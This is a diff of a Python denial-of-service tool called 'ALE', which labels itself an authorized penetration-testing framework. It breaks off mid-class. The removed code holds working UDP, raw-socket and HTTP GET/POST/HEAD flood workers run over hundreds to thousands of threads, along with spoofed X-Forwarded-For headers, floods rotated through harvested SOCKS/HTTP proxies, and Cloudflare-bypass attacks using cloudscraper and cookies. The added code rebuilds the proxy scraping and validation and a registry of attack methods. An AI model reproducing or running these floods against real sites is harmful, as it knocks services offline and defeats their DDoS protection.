@@ -1,1182 +1,1298 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
 """
-ALE - Advanced Layer Exploitation
-Authorized Penetration Testing Framework
+___       __       _______ 
+      /   \     |  |     |   ____|
+     /  ^  \    |  |     |  |__   
+    /  /_\  \   |  |     |   __|  
+   /  _____  \  |  `----.|  |____ 
+  /__/     \__\ |_______||_______|
+
 """
 
 import os
 import sys
 import json
+import time
 import random
 import socket
+import struct
 import ssl
-import time
 import threading
-import datetime
-from pathlib import Path
-from typing import Optional, Dict, List, Tuple, Any, Callable
-from urllib.parse import urlparse
+import concurrent.futures
+import urllib.request
+import urllib.parse
+import urllib.error
+import re
+import ipaddress
+import base64
+import hashlib
+import hmac
+import zlib
+from datetime import datetime, timedelta
+from typing import List, Tuple, Optional, Set, Dict, Any
+from queue import Queue, Empty
+from dataclasses import dataclass
+from enum import IntEnum
 
-_MISSING_MODULES = set()
+try:
+    import requests
+except ImportError:
+    requests = None
 
-def _import_or_mock(module_name: str, mock_attr: str = None):
-    """Try to import a module; if missing, add to _MISSING_MODULES set."""
-    try:
-        return __import__(module_name)
-    except ImportError:
-        _MISSING_MODULES.add(module_name)
-        return None
-requests = _import_or_mock('requests')
-colorama_mod = _import_or_mock('colorama')
-if colorama_mod:
-    from colorama import Fore, Style, init as colorama_init
-else:
-    class DummyColor:
-        def __getattr__(self, name):
-            return ''
-    Fore = DummyColor()
-    Style = DummyColor()
-    def colorama_init(*args, **kwargs): pass
+try:
+    import cloudscraper
+except ImportError:
+    cloudscraper = None
 
-# Optional modules
-cloudscraper = _import_or_mock('cloudscraper')
-socks = _import_or_mock('socks')  # PySocks
-httpx = _import_or_mock('httpx')
-webdriver = _import_or_mock('undetected_chromedriver')
-RequestsCookieJar = None
-if requests:
-    from requests.cookies import RequestsCookieJar
+try:
+    import dns.resolver
+except ImportError:
+    dns = None
 
+try:
+    import socks as sockslib
+except ImportError:
+    sockslib = None
 
-# =============================================================================
-# Configuration
-# =============================================================================
+try:
+    from colorama import init, Fore, Style
+    init(autoreset=True)
+    COLORS = True
+except ImportError:
+    COLORS = False
 
-class Config:
-    """Central configuration for ALE framework."""
-    
-    RESOURCES_DIR = Path("./resources")
-    PROXY_FILE = Path("./proxy.txt")
-    UA_FILE = RESOURCES_DIR / "ua.txt"
-    SOCKS5_FILE = RESOURCES_DIR / "socks5.txt"
-    
+# ─── Color helpers ────────────────────────────────────────────────────────────
 
-    THREAD_MULTIPLIER = 4  
-    DEFAULT_THREADS = 200 * THREAD_MULTIPLIER
-    MAX_THREADS = 2000 * THREAD_MULTIPLIER
-    
-    # Timeouts
-    SOCKET_TIMEOUT = 5
-    REQUEST_TIMEOUT = 15
-    CF_BYPASS_MAX_WAIT = 60
-    
-    # Attack defaults
-    DEFAULT_PAYLOAD_SIZE = 60000
-    SEND_LOOPS = 100  
-    RECONNECT_INTERVAL = 0.01
-    
-    # Colors
-    C_PRIMARY = '\x1b[38;2;0;236;250m'
-    C_ACCENT = '\x1b[38;2;255;20;147m'  
-    C_HIGHLIGHT = '\x1b[38;2;0;255;189m'  
-    C_INPUT = '\x1b[38;2;0;255;0m'
-    C_LABEL = '\x1b[38;2;255;255;255m'
-    C_BORDER = '\x1b[38;2;0;236;250m'
-    
-    if not colorama_mod:
-        C_PRIMARY = C_ACCENT = C_HIGHLIGHT = C_INPUT = C_LABEL = C_BORDER = ''
+def c(text: str, color: str = "") -> str:
+    if COLORS and color:
+        return f"{color}{text}{Style.RESET_ALL}"
+    return text
 
+def print_status(msg: str):
+    print(f"[{c('+', Fore.GREEN)}] {msg}")
 
-class State:
-    """Global runtime state."""
-    
-    user_agents: List[str] = []
-    proxies: List[str] = []
-    proxy_socks5: List[str] = []
-    cf_cookie_name: str = ""
-    cf_cookie_value: str = ""
-    cf_user_agent: str = ""
-    
-    @classmethod
-    def load_user_agents(cls) -> None:
-        """Load user agents from file or generate defaults."""
-        try:
-            if Config.UA_FILE.exists():
-                cls.user_agents = [l.strip() for l in Config.UA_FILE.read_text().splitlines() if l.strip()]
-            if not cls.user_agents:
-                cls.user_agents = [
-                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-                    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-                    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
-                    "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
-                ]
-        except Exception:
-            cls.user_agents = ["Mozilla/5.0 (compatible; ALE/1.0)"]
-    
-    @classmethod
-    def load_proxies(cls, filepath: Path = Config.PROXY_FILE) -> bool:
-        """Load HTTP/HTTPS proxies from file."""
-        try:
-            if not filepath.exists():
-                print(f" [*] Proxy file not found: {filepath}")
-                return False
-            content = filepath.read_text().strip()
-            cls.proxies = [p.strip() for p in content.split('\n') if p.strip()]
-            print(f" [*] Loaded {len(cls.proxies)} proxies from {filepath}")
-            return len(cls.proxies) > 0
-        except Exception as e:
-            print(f" [!] Error loading proxies: {e}")
+def print_info(msg: str):
+    print(f"[{c('*', Fore.CYAN)}] {msg}")
+
+def print_error(msg: str):
+    print(f"[{c('!', Fore.RED)}] {msg}")
+
+def print_warn(msg: str):
+    print(f"[{c('-', Fore.YELLOW)}] {msg}")
+
+# ─── Proxy Type Enum ─────────────────────────────────────────────────────────
+
+class ProxyType(IntEnum):
+    HTTP = 1
+    SOCKS4 = 4
+    SOCKS5 = 5
+
+# ─── Proxy Data Class ────────────────────────────────────────────────────────
+
+@dataclass
+class Proxy:
+    ip: str
+    port: int
+    proxy_type: ProxyType
+    username: str = ""
+    password: str = ""
+
+    def __str__(self) -> str:
+        return f"{self.ip}:{self.port}"
+
+    def __hash__(self) -> int:
+        return hash((self.ip, self.port, self.proxy_type))
+
+    def __eq__(self, other) -> bool:
+        if not isinstance(other, Proxy):
             return False
-    
-    @classmethod
-    def fetch_socks5_proxies(cls) -> List[str]:
-        """Fetch SOCKS5 proxies from public APIs."""
-        if not requests:
-            print(" [!] 'requests' module required for fetching proxies")
-            return []
-        try:
-            urls = [
-                "https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all",
-                "https://www.proxy-list.download/api/v1/get?type=socks5",
-            ]
-            combined = ""
-            for url in urls:
+        return self.ip == other.ip and self.port == other.port and self.proxy_type == other.proxy_type
+
+    def to_url(self) -> str:
+        """Convert to URL format for requests library."""
+        scheme_map = {ProxyType.HTTP: "http", ProxyType.SOCKS4: "socks4", ProxyType.SOCKS5: "socks5"}
+        scheme = scheme_map.get(self.proxy_type, "http")
+        return f"{scheme}://{self.ip}:{self.port}"
+
+    def to_socks_tuple(self) -> tuple:
+        """Returns (ip, port) for socket-level SOCKS usage."""
+        return (self.ip, self.port)
+
+# ─── Proxy Utilities ─────────────────────────────────────────────────────────
+
+class ProxyUtiles:
+    """Parsing and utility functions for proxies."""
+
+    IP_PORT_REGEX = re.compile(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\s*[:\s]\s*(\d{2,5})')
+    HTML_PROXY_REGEX = re.compile(
+        r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})[^<]*?[:\s](\d{2,5})',
+        re.IGNORECASE | re.DOTALL
+    )
+    TABLE_PROXY_REGEX = re.compile(
+        r'<td>(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})</td>\s*<td>(\d{2,5})</td>',
+        re.IGNORECASE
+    )
+
+    @staticmethod
+    def parseAll(data: str, proxy_type: ProxyType) -> Set[Proxy]:
+        """Parse proxy data from text, handling multiple formats."""
+        proxies: Set[Proxy] = set()
+
+        if not data:
+            return proxies
+
+        lines = data.split('\n')
+
+        for line in lines:
+            line = line.strip()
+            if not line or line.startswith('#') or line.startswith('//'):
+                continue
+
+            match = ProxyUtiles.IP_PORT_REGEX.search(line)
+            if match:
+                ip, port_str = match.group(1), match.group(2)
                 try:
-                    combined += requests.get(url, timeout=10).text + "\n"
-                except:
+                    port = int(port_str)
+                    if 0 < port < 65536:
+                        proxies.add(Proxy(ip=ip, port=port, proxy_type=proxy_type))
+                        continue
+                except ValueError:
                     pass
-            
-            if not combined.strip():
-                return []
-            
-            Config.SOCKS5_FILE.parent.mkdir(parents=True, exist_ok=True)
-            Config.SOCKS5_FILE.write_text(combined)
-            cls.proxy_socks5 = [p.strip() for p in combined.splitlines() if p.strip()]
-            print(f" [*] Fetched {len(cls.proxy_socks5)} SOCKS5 proxies")
-            return cls.proxy_socks5
+
+            table_match = ProxyUtiles.TABLE_PROXY_REGEX.search(line)
+            if table_match:
+                try:
+                    port = int(table_match.group(2))
+                    if 0 < port < 65536:
+                        proxies.add(Proxy(ip=table_match.group(1), port=port, proxy_type=proxy_type))
+                        continue
+                except ValueError:
+                    pass
+
+        # If line-by-line parsing found nothing, try full-text regex
+        if not proxies:
+            for match in ProxyUtiles.IP_PORT_REGEX.finditer(data):
+                try:
+                    port = int(match.group(2))
+                    if 0 < port < 65536:
+                        proxies.add(Proxy(ip=match.group(1), port=port, proxy_type=proxy_type))
+                except ValueError:
+                    pass
+
+        return proxies
+
+    @staticmethod
+    def parse_html_table(html: str, proxy_type: ProxyType) -> Set[Proxy]:
+        """Parse proxy tables from HTML pages (hidemy.name, proxydb.net, etc.)."""
+        proxies: Set[Proxy] = set()
+        for match in ProxyUtiles.TABLE_PROXY_REGEX.finditer(html):
+            try:
+                port = int(match.group(2))
+                if 0 < port < 65536:
+                    proxies.add(Proxy(ip=match.group(1), port=port, proxy_type=proxy_type))
+            except ValueError:
+                pass
+        return proxies
+
+    @staticmethod
+    def save_proxies_to_file(proxies: Set[Proxy], filepath: str):
+        """Save proxies to a file, one per line."""
+        os.makedirs(os.path.dirname(filepath) or '.', exist_ok=True)
+        with open(filepath, 'w') as f:
+            for p in sorted(proxies, key=lambda x: f"{x.ip}:{x.port}"):
+                f.write(f"{p.ip}:{p.port}\n")
+
+    @staticmethod
+    def load_proxies_from_file(filepath: str) -> Set[Proxy]:
+        """Load proxies from a file."""
+        proxies: Set[Proxy] = set()
+        if not os.path.exists(filepath):
+            return proxies
+        with open(filepath, 'r') as f:
+            for line in f:
+                line = line.strip()
+                if line and ':' in line:
+                    parts = line.split(':')
+                    if len(parts) >= 2:
+                        try:
+                            ip, port_str = parts[0], parts[1]
+                            port = int(port_str)
+                            if 0 < port < 65536:
+                                proxies.add(Proxy(ip=ip, port=port, proxy_type=ProxyType.SOCKS5))
+                        except ValueError:
+                            pass
+        return proxies
+
+
+# ─── Proxy Manager ───────────────────────────────────────────────────────────
+
+class ProxyManager:
+    """Downloads, validates, and manages proxies from providers in config.json."""
+
+    def __init__(self, config: dict):
+        self.config = config
+        self.providers = config.get("proxy-providers", [])
+        self.proxy_dir = config.get("proxy-directory", "files/proxies")
+        self.all_proxies: Set[Proxy] = set()
+        self.lock = threading.Lock()
+        os.makedirs(self.proxy_dir, exist_ok=True)
+
+    def download_from_provider(self, provider: dict) -> List[Proxy]:
+        """Download proxies from a single provider."""
+        url = provider.get("url", "")
+        timeout = provider.get("timeout", 7)
+        proxy_type = ProxyType(provider.get("type", 5))
+        proxies: List[Proxy] = []
+
+        try:
+            req = urllib.request.Request(
+                url,
+                headers={
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+                }
+            )
+            with urllib.request.urlopen(req, timeout=timeout) as resp:
+                data = resp.read().decode('utf-8', errors='replace')
+
+            parsed = ProxyUtiles.parseAll(data, proxy_type)
+
+            if not parsed and ('<table' in data or '<td' in data):
+                parsed = ProxyUtiles.parse_html_table(data, proxy_type)
+
+            if not parsed:
+                for match in ProxyUtiles.IP_PORT_REGEX.finditer(data):
+                    try:
+                        port = int(match.group(2))
+                        if 0 < port < 65536:
+                            parsed.add(Proxy(ip=match.group(1), port=port, proxy_type=proxy_type))
+                    except ValueError:
+                        pass
+
+            proxies = list(parsed)
+            if proxies:
+                print_status(f"Downloaded {len(proxies)} {proxy_type.name} proxies from {url.split('/')[2]}")
+
         except Exception as e:
-            print(f" [!] Failed to fetch SOCKS5 proxies: {e}")
-            return []
+            print_warn(f"Failed to download from {url.split('/')[2]}: {e}")
 
+        return proxies
 
-########################UTILITY FUNTIONS#########################################
-class Utils:
-    """Utility functions."""
-    
-    @staticmethod
-    def clear_screen() -> None:
-        """Clear terminal screen."""
-        os.system('cls' if os.name == 'nt' else 'clear')
-    
-    @staticmethod
-    def random_ip() -> str:
-        """Generate a random non-routable-looking IP."""
-        return f"{random.randint(11, 197)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(2, 254)}"
-    
-    @staticmethod
-    def get_target_info(url: str) -> Dict[str, Any]:
-        """Parse target URL into components."""
-        url = url.strip()
-        parsed = urlparse(url)
-        host = parsed.netloc.split(':')[0]
-        port = "443" if parsed.scheme == "https" else "80"
-        if ":" in parsed.netloc:
-            port = parsed.netloc.split(":")[1]
-        return {
-            'uri': parsed.path or "/",
-            'host': host,
-            'scheme': parsed.scheme or "https",
-            'port': port,
-        }
-    
-    @staticmethod
-    def build_http_request(target: Dict[str, Any], extra_headers: str = "") -> str:
-        """Build a raw HTTP request string."""
-        ua = random.choice(State.user_agents) if State.user_agents else "Mozilla/5.0"
-        req = f"GET {target['uri']} HTTP/1.1\r\n"
-        req += f"Host: {target['host']}\r\n"
-        req += f"User-Agent: {ua}\r\n"
-        req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
-        req += extra_headers
-        req += "Connection: Keep-Alive\r\n\r\n"
-        return req
-    
-    @staticmethod
-    def spoof_headers(target: Dict[str, Any]) -> str:
-        """Generate spoofed headers for request forgery."""
-        ip = Utils.random_ip()
-        return (
-            f"X-Forwarded-Proto: Http\r\n"
-            f"X-Forwarded-Host: {target['host']}, 1.1.1.1\r\n"
-            f"Via: {ip}\r\n"
-            f"Client-IP: {ip}\r\n"
-            f"X-Forwarded-For: {ip}\r\n"
-            f"Real-IP: {ip}\r\n"
-        )
-    
-    @staticmethod
-    def create_socket(target: Dict[str, Any], proxy: Optional[Tuple[str, int, int]] = None) -> Optional[socket.socket]:
-        """Create a socket connection, optionally through a proxy."""
+    def download_all(self) -> int:
+        """Download proxies from all providers concurrently."""
+        print_info("Downloading proxies from all providers...")
+        all_proxies: Set[Proxy] = set()
+        total_downloaded = 0
+
+        with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
+            futures = {executor.submit(self.download_from_provider, p): p for p in self.providers}
+            for future in concurrent.futures.as_completed(futures):
+                proxies = future.result()
+                with self.lock:
+                    for p in proxies:
+                        if p not in all_proxies:
+                            all_proxies.add(p)
+                            total_downloaded += 1
+
+        self.all_proxies = all_proxies
+        print_status(f"Total unique proxies collected: {len(all_proxies)}")
+        return len(all_proxies)
+
+    def validate_proxy(self, proxy: Proxy, test_url: str = "http://httpbin.org/ip", timeout: int = 5) -> bool:
+        """Test if a proxy is working by making a request through it."""
         try:
-            if proxy:
-                if not socks:
-                    return None
-                s = socks.socksocket()
-                s.set_proxy(socks.SOCKS5 if proxy[2] == 5 else socks.HTTP, proxy[0], proxy[1])
-            else:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            
-            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-            s.settimeout(Config.SOCKET_TIMEOUT)
-            s.connect((target['host'], int(target['port'])))
-            
-            if target['scheme'] == 'https':
-                ctx = ssl.create_default_context()
-                s = ctx.wrap_socket(s, server_hostname=target['host'])
-            
-            return s
+            if requests is None:
+                return True
+
+            proxies_dict = {
+                'http': proxy.to_url(),
+                'https': proxy.to_url().replace('http://', 'https://')
+            }
+
+            resp = requests.get(
+                test_url,
+                proxies=proxies_dict,
+                timeout=timeout,
+                headers={'User-Agent': 'Mozilla/5.0'},
+                verify=False
+            )
+            return resp.status_code == 200
         except Exception:
-            return None
-    
-    @staticmethod
-    def get_standard_headers() -> Dict[str, str]:
-        """Return standard HTTP headers dict."""
-        ua = random.choice(State.user_agents) if State.user_agents else "Mozilla/5.0"
-        return {
-            'User-Agent': ua,
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'Accept-Language': 'en-US,en;q=0.9',
-            'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
-            'Cache-Control': 'no-cache',
-            'Pragma': 'no-cache',
-            'Connection': 'keep-alive',
-            'Upgrade-Insecure-Requests': '1',
-            'Sec-Fetch-Dest': 'document',
-            'Sec-Fetch-Mode': 'navigate',
-            'Sec-Fetch-Site': 'same-origin',
-            'Sec-Fetch-User': '?1',
-            'TE': 'trailers',
-        }
-    
-    @staticmethod
-    def check_module(name: str) -> bool:
-        """Check if a module is available and warn if not."""
-        if name in _MISSING_MODULES:
-            print(f" [!] Module '{name}' not installed. Install with: pip3 install {name}")
             return False
-        return True
+
+    def validate_all(self, max_workers: int = 50, test_url: str = "http://httpbin.org/ip") -> Set[Proxy]:
+        """Validate all collected proxies."""
+        print_info(f"Validating {len(self.all_proxies)} proxies...")
+        valid: Set[Proxy] = set()
+        validated = 0
+
+        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
+            futures = {}
+            for proxy in self.all_proxies:
+                future = executor.submit(self.validate_proxy, proxy, test_url)
+                futures[future] = proxy
+
+            for future in concurrent.futures.as_completed(futures):
+                proxy = futures[future]
+                validated += 1
+                if future.result():
+                    valid.add(proxy)
+                if validated % 500 == 0:
+                    print_info(f"Validated {validated}/{len(self.all_proxies)} proxies, {len(valid)} working")
+
+        print_status(f"Working proxies: {len(valid)}/{len(self.all_proxies)}")
+        return valid
+
+    def save_by_type(self, proxies: Set[Proxy]):
+        """Save proxies grouped by type."""
+        for ptype in [ProxyType.HTTP, ProxyType.SOCKS4, ProxyType.SOCKS5]:
+            type_proxies = {p for p in proxies if p.proxy_type == ptype}
+            if type_proxies:
+                filename = f"{ptype.name.lower()}.txt"
+                filepath = os.path.join(self.proxy_dir, filename)
+                ProxyUtiles.save_proxies_to_file(type_proxies, filepath)
+                print_status(f"Saved {len(type_proxies)} {ptype.name} proxies to {filepath}")
+
+    def get_proxy_list_file(self, socks_type: int) -> str:
+        """Get the proxy list file path for a given SOCKS type."""
+        ptype = ProxyType(socks_type) if socks_type in [1, 4, 5] else ProxyType.SOCKS5
+        filename = f"{ptype.name.lower()}.txt"
+        return os.path.join(self.proxy_dir, filename)
+
+    def handle_proxy_list(self, socks_type: int) -> str:
+        """
+        Main entry point: download all proxies, save them, return path to type-specific file.
+        """
+        socks_type = socks_type if socks_type in [1, 4, 5] else 5
+        self.download_all()
+        self.save_by_type(self.all_proxies)
+        return self.get_proxy_list_file(socks_type)
 
 
-###########################TIMER COUNTDOWN###########################
+# ─── Methods Registry ────────────────────────────────────────────────────────
 
-class AttackTimer:
-    """Manages attack duration and countdown display."""
-    
-    def __init__(self, duration_seconds: int):
-        self.duration = int(duration_seconds)
-        self.end_time = datetime.datetime.now() + datetime.timedelta(seconds=self.duration)
-        self._running = False
-    
-    @property
-    def remaining(self) -> float:
-        return (self.end_time - datetime.datetime.now()).total_seconds()
-    
-    @property
-    def expired(self) -> bool:
-        return self.remaining <= 0
-    
-    def display(self) -> None:
-        """Display countdown in a loop (blocking)."""
-        self._running = True
-        while self._running and not self.expired:
-            sys.stdout.flush()
-            sys.stdout.write(f"\r [*] Attack status => {self.remaining:.1f} sec left ")
-            time.sleep(0.1)
-        sys.stdout.write(f"\r [*] Attack Done!{' ' * 40}\n")
-        self._running = False
+class Methods:
+    """Registry of all attack methods."""
 
-class AttackBase:
-    """Base class for all attack methods."""
-    
-    name = "base"
-    requires_modules: List[str] = []
-    
-    def __init__(self, target_url: str, threads: int, duration: int):
-        self.target_url = target_url
-        self.target = Utils.get_target_info(target_url)
-        self.threads = min(int(threads), Config.MAX_THREADS)
-        self.duration = int(duration)
-        self.timer = AttackTimer(self.duration)
-    
-    def _check_requirements(self) -> bool:
-        """Check if all required modules are available."""
-        for mod in self.requires_modules:
-            if not Utils.check_module(mod):
-                return False
-        return True
-    
-    def worker(self) -> None:
-        """Individual worker thread function - override in subclass."""
-        raise NotImplementedError
-    def launch(self) -> None:
-        """Launch the attack with configured threads."""
-        if not self._check_requirements():
-            return
-        print(f" [*] Launching {self.name} attack on {self.target_url}")
-        print(f" [*] Threads: {self.threads} | Duration: {self.duration}s")
-        timer_thread = threading.Thread(target=self.timer.display, daemon=True)
-        timer_thread.start()
-        workers = []
-        for i in range(self.threads):
-            t = threading.Thread(target=self.worker, daemon=True)
-            t.start()
-            workers.append(t)
-            if i % 50 == 0:
-                time.sleep(0.001)
-        timer_thread.join()
-
-
-####################LAYER 4 CONFIGURATION#################################################
-class UDPFlood(AttackBase):
-    """UDP flood attack."""
-    name = "UDP Flood"
-    
-    def worker(self) -> None:
-        payload = random._urandom(Config.DEFAULT_PAYLOAD_SIZE)
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        except:
-            return
-        
-        while not self.timer.expired:
-            try:
-                sock.sendto(payload, (self.target['host'], int(self.target['port'])))
-            except:
-                try:
-                    sock.close()
-                except:
-                    pass
-                try:
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-                except:
-                    break
-
-
-class TCPFlood(AttackBase):
-    """TCP flood using raw packets."""
-    name = "TCP Flood"
-    
-    def worker(self) -> None:
-        payload = random._urandom(4096)
-        try:
-            sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
-        except:
-            return
-        
-        while not self.timer.expired:
-            try:
-                sock.sendto(payload, (self.target['host'], int(self.target['port'])))
-            except:
-                try:
-                    sock.close()
-                except:
-                    pass
-                try:
-                    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
-                except:
-                    break
-
-
-###################LAYER 7 CONFIGURATION####################################
-
-class HTTPGetAttack(AttackBase):
-    """Simple HTTP GET request attack."""
-    name = "HTTP GET"
-    requires_modules = ['requests']
-    
-    def worker(self) -> None:
-        headers = Utils.get_standard_headers()
-        while not self.timer.expired:
-            try:
-                requests.get(self.target_url, headers=headers, timeout=Config.REQUEST_TIMEOUT)
-            except:
-                pass
-
-
-class HTTPPostAttack(AttackBase):
-    """Simple HTTP POST request attack."""
-    name = "HTTP POST"
-    requires_modules = ['requests']
-    
-    def worker(self) -> None:
-        while not self.timer.expired:
-            try:
-                requests.post(self.target_url, timeout=Config.REQUEST_TIMEOUT)
-            except:
-                pass
-
-
-class HTTPHeadAttack(AttackBase):
-    """Simple HTTP HEAD request attack."""
-    name = "HTTP HEAD"
-    requires_modules = ['requests']
-    
-    def worker(self) -> None:
-        while not self.timer.expired:
-            try:
-                requests.head(self.target_url, timeout=Config.REQUEST_TIMEOUT)
-            except:
-                pass
-
-
-class ProxyGetAttack(AttackBase):
-    """GET request attack through proxies."""
-    name = "Proxy GET"
-    requires_modules = ['requests']
-    
-    def worker(self) -> None:
-        while not self.timer.expired and State.proxies:
-            try:
-                proxy_addr = f"http://{random.choice(State.proxies)}"
-                proxies = {'http': proxy_addr, 'https': proxy_addr}
-                requests.get(self.target_url, proxies=proxies, timeout=Config.REQUEST_TIMEOUT)
-            except:
-                pass
-
-
-class SocketAttack(AttackBase):
-    """Raw socket connection attack."""
-    name = "Socket"
-    
-    def __init__(self, target_url: str, threads: int, duration: int):
-        super().__init__(target_url, threads, duration)
-        self.request = Utils.build_http_request(self.target)
-    
-    def worker(self) -> None:
-        s = None
-        while not self.timer.expired:
-            if s is None:
-                s = Utils.create_socket(self.target)
-                if s is None:
-                    time.sleep(0.1)
-                    continue
-            
-            try:
-                for _ in range(Config.SEND_LOOPS):
-                    s.send(self.request.encode())
-            except:
-                try:
-                    s.close()
-                except:
-                    pass
-                s = None
-
-
-class ProxySocketAttack(AttackBase):
-    """Socket attack through HTTP proxies."""
-    name = "Proxy Socket"
-    requires_modules = ['socks']
-    
-    def __init__(self, target_url: str, threads: int, duration: int):
-        super().__init__(target_url, threads, duration)
-        self.request = Utils.build_http_request(self.target)
-    
-    def worker(self) -> None:
-        while not self.timer.expired and State.proxies:
-            try:
-                proxy = random.choice(State.proxies).split(":")
-                s = Utils.create_socket(self.target, proxy=(proxy[0], int(proxy[1]), 1))
-                if s is None:
-                    continue
-                for _ in range(Config.SEND_LOOPS):
-                    s.send(self.request.encode())
-                s.close()
-            except:
-                pass
-
-
-class SpoofSocketAttack(AttackBase):
-    """Socket attack with spoofed headers."""
-    name = "Spoof Socket"
-    
-    def __init__(self, target_url: str, threads: int, duration: int):
-        super().__init__(target_url, threads, duration)
-        spoof = Utils.spoof_headers(self.target)
-        self.request = Utils.build_http_request(self.target, spoof)
-    
-    def worker(self) -> None:
-        s = None
-        while not self.timer.expired:
-            if s is None:
-                s = Utils.create_socket(self.target)
-                if s is None:
-                    time.sleep(0.1)
-                    continue
-            try:
-                for _ in range(Config.SEND_LOOPS):
-                    s.send(self.request.encode())
-            except:
-                try:
-                    s.close()
-                except:
-                    pass
-                s = None
-
-
-class SpoofProxySocketAttack(AttackBase):
-    """Socket attack with spoofed headers through SOCKS5 proxies."""
-    name = "Spoof Proxy Socket"
-    requires_modules = ['socks']
-    
-    def __init__(self, target_url: str, threads: int, duration: int):
-        super().__init__(target_url, threads, duration)
-        spoof = Utils.spoof_headers(self.target)
-        self.request = Utils.build_http_request(self.target, spoof)
-        State.fetch_socks5_proxies()
-    
-    def worker(self) -> None:
-        while not self.timer.expired and State.proxy_socks5:
-            try:
-                proxy = random.choice(State.proxy_socks5).split(":")
-                s = Utils.create_socket(self.target, proxy=(proxy[0], int(proxy[1]), 5))
-                if s is None:
-                    continue
-                for _ in range(Config.SEND_LOOPS):
-                    s.send(self.request.encode())
-                s.close()
-            except:
-                pass
-
-
-class PPSAttack(AttackBase):
-    """PPS (Packets Per Second) minimal request attack."""
-    name = "PPS"
-    
-    def worker(self) -> None:
-        req = "GET / HTTP/1.1\r\n\r\n"
-        s = None
-        while not self.timer.expired:
-            if s is None:
-                s = Utils.create_socket(self.target)
-                if s is None:
-                    time.sleep(0.1)
-                    continue
-            try:
-                for _ in range(Config.SEND_LOOPS):
-                    s.send(req.encode())
-            except:
-                try:
-                    s.close()
-                except:
-                    pass
-                s = None
-
-
-class NullAttack(AttackBase):
-    """Attack with null user-agent and spoofed headers."""
-    name = "NULL"
-    
-    def __init__(self, target_url: str, threads: int, duration: int):
-        super().__init__(target_url, threads, duration)
-        spoof = Utils.spoof_headers(self.target)
-        self.request = (
-            f"GET {self.target['uri']} HTTP/1.1\r\n"
-            f"Host: {self.target['host']}\r\n"
-            "User-Agent: null\r\n"
-            "Referrer: null\r\n"
-            f"{spoof}\r\n"
-        )
-    
-    def worker(self) -> None:
-        s = None
-        while not self.timer.expired:
-            if s is None:
-                s = Utils.create_socket(self.target)
-                if s is None:
-                    time.sleep(0.1)
-                    continue
-            try:
-                for _ in range(Config.SEND_LOOPS):
-                    s.send(self.request.encode())
-            except:
-                try:
-                    s.close()
-                except:
-                    pass
-                s = None
-
-
-class CloudflareBypassAttack(AttackBase):
-    """Cloudflare bypass using cloudscraper."""
-    name = "CF Bypass"
-    requires_modules = ['cloudscraper']
-    
-    def __init__(self, target_url: str, threads: int, duration: int):
-        super().__init__(target_url, threads, duration)
-        self.scraper = cloudscraper.create_scraper()
-    
-    def worker(self) -> None:
-        while not self.timer.expired:
-            try:
-                self.scraper.get(self.target_url, timeout=Config.REQUEST_TIMEOUT)
-            except:
-                pass
-
-
-class ProxyCloudflareBypassAttack(AttackBase):
-    """Cloudflare bypass through proxies."""
-    name = "Proxy CF Bypass"
-    requires_modules = ['cloudscraper']
-    
-    def __init__(self, target_url: str, threads: int, duration: int):
-        super().__init__(target_url, threads, duration)
-        self.scraper = cloudscraper.create_scraper()
-    
-    def worker(self) -> None:
-        while not self.timer.expired and State.proxies:
-            try:
-                proxy = f"http://{random.choice(State.proxies)}"
-                self.scraper.get(self.target_url, proxies={'http': proxy, 'https': proxy})
-            except:
-                pass
-
-
-class CFProAttack(AttackBase):
-    """Advanced CF bypass with cookies and full headers."""
-    name = "CF Pro"
-    requires_modules = ['requests', 'cloudscraper']
-    
-    def worker(self) -> None:
-        if not State.cf_cookie_name:
-            return
-        
-        session = requests.Session()
-        scraper = cloudscraper.create_scraper(sess=session)
-        jar = RequestsCookieJar()
-        jar.set(State.cf_cookie_name, State.cf_cookie_value)
-        scraper.cookies = jar
-        
-        ua = State.cf_user_agent or "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8"
-        headers = Utils.get_standard_headers()
-        headers['User-Agent'] = ua
-        
-        while not self.timer.expired:
-            try:
-                scraper.get(url=self.target_url, headers=headers, allow_redirects=False)
-            except:
-                pass
-class CFSocketAttack(AttackBase):
-    """CF bypass using raw sockets with cookies."""
-    name = "CF Socket"
-    
